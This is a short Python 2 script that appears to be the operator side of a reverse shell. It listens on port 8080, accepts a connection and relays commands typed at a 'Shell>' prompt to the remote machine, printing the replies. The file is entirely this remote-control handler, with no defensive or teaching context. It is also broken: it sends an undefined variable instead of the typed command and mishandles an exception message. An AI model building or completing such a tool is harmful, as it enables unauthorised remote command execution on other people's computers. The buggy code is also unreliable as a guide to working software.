import socket
import sys
def Create_Socket():
    try:
        global host
        global port
        global s
        host=''
        port=8080
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        #s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except socket.error as e:
        print 'Error message:'+e
def Bind_Socket():
   try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind(((host),(port)))
        s.listen(1)
   except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        Bind_Socket()
def Socket_Accept():
    conn,addr=s.accept()
    print addr[0]+':'+str(addr[1])+' connected.'
    conn.send('Hello Client!')
    while True:
     icmd=raw_input("Shell>")
     if "terminate" in icmd:
            conn.send("terminate!")
            conn.close()
            s.close()
            sys.exit()
            break
     else:
            conn.send(command)
            print conn.recv(1024)
             
    

    
def main():
    Create_Socket()
    Bind_Socket()
    Socket_Accept()
main()
